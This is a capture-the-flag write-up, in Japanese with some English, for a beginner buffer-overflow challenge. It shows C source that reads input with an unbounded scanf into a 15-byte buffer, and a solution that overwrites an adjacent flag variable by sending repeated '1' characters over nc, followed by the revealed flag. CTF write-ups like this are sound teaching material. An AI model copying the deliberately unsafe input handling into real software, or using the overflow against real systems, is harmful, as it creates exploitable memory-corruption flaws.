# buffer_overflow:PWN:50pts
バッファオーバーフローを知っていますか？  
Do you know buffer overflow?  
コンパイルオプションは-fno-stack-protectorをつけています。  
```bash
gcc ./bof_source.c -fno-stack-protector
```

`nc uectf.uec.tokyo 30002`

[bof_source.c](bof_source.c)  

# Solution
接続先とソースが配布される。  
ソースを見ると以下のようであった。  
```C
#include<stdio.h>
#include<string.h>
int debug();
int main(){
  char debug_flag,name[15];
  debug_flag='0';
  printf("What is your name?\n>");
  scanf("%s",name);
  if(debug_flag=='1'){
    debug();
  }
  printf("Hello %s.\n",name);
  return 0;
}

int debug(){
  char flag[32]="CTF{THIS_IS_NOT_TRUE_FLAG}";
  printf("[DEBUG]:flag is %s\n",flag);
}
```
なんとか`debug_flag`を1にすればいいようだが、自明なBOFがある。  
以下のように1を連打する。  
```bash
$ nc uectf.uec.tokyo 30002
What is your name?
>1111111111111111
[DEBUG]:flag is UECTF{ye4h_th1s_i5_B0f_flag}
Hello 1111111111111111.
```
flagが得られた。  

## UECTF{ye4h_th1s_i5_B0f_flag}